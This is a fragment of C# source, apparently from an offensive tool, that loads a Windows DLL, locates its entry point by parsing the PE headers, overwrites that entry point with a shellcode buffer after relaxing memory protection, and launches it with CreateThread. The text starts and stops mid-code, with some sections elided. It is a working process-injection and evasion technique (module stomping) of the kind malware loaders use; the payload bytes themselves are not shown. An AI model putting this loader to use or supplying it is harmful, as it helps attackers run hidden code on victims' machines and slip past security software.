...
/*************************/
            ...
            {
                Console.WriteLine("[!] LoadLibrary failed to load {0}\n", dll_name);
                return;
            }

            try
            {
                Console.WriteLine("[*] {0} Base Address: 0x{1:X}", dll_name, (Int64)hTargetDLL);
                Utility.Win32.IMAGE_DOS_HEADER *mz_header = (Utility.Win32.IMAGE_DOS_HEADER*)hTargetDLL.ToPointer();
                Console.WriteLine("[*] {0} mz header PE OFffset 0x{1:X}", dll_name, mz_header->e_lfanew);

                Utility.Win32.IMAGE_NT_HEADERS64 *pe_header = (Utility.Win32.IMAGE_NT_HEADERS64*)((Int64)mz_header + mz_header->e_lfanew);
                ...
                IntPtr addressOfEntryPoint = new IntPtr( (Int64)mz_header + pe_header->OptionalHeader.AddressOfEntryPoint );
                Console.WriteLine("[*] {0} EntryPoint Address 0x{1:X}", dll_name, (Int64)addressOfEntryPoint);

                uint out1 = 0;

                Utility.Win32.VirtualProtect( addressOfEntryPoint, (UIntPtr)buf.Length, 0x4, out out1 );
				Console.WriteLine("[*] {0} Overwriting the entrypoint with shellcode", dll_name);
                fixed (byte *p = buf)
                {
                    Utility.Win32.memcpy(addressOfEntryPoint, (IntPtr)p, (UIntPtr)buf.Length);
                }
                Utility.Win32.VirtualProtect( addressOfEntryPoint, (UIntPtr)buf.Length, out1, out out1);

				Console.WriteLine("[*] {0} Sleeping 20 seconds", dll_name);
//                Thread.Sleep(20000);
				Console.WriteLine("[*] {0} CreateThread to start shellcode", dll_name);
				Utility.Win32.CreateThread( IntPtr.Zero, 0, addressOfEntryPoint, IntPtr.Zero, 0, IntPtr.Zero );
            }
            catch (Exception e)
            {
